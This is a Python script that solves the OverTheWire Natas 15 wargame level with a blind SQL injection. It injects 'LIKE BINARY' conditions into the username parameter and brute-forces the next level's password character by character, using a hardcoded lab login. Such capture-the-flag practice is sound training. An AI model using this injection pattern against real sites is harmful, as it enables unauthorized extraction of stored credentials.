import requests

length = 32
characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890'
url = 'http://natas15.natas.labs.overthewire.org/index.php'
good_text = 'This user exists.'
present_chars = ''

for i in range(62) :
	query = 'natas16" and password LIKE BINARY "%' + characters[i] + '%'
	print("[+] Trying [query : ",end="")
	print(query,end="")
	x = requests.get(url, auth=('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), params={'username': query} )
	if good_text in x.text : 
		present_chars += characters[i]
		print(" ]   [+] True")
	else :
		print(" ]   [-] False")

print(present_chars)
print(len(present_chars))
password = ''

for i in range(32) :
	for j in range(25) : 
		query = 'natas16" and password LIKE BINARY "' + password + present_chars[j] + '%'
		print("[+] Trying [query : ",end="")
		print(query,end="")
		x = requests.get(url, auth=('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), params={'username': query} )
		if good_text in x.text : 
			password += present_chars[j]
			print(" ]   [+] True")
			break;
		else :
			print(" ]   [-] False")

print(password)
print(len(password))
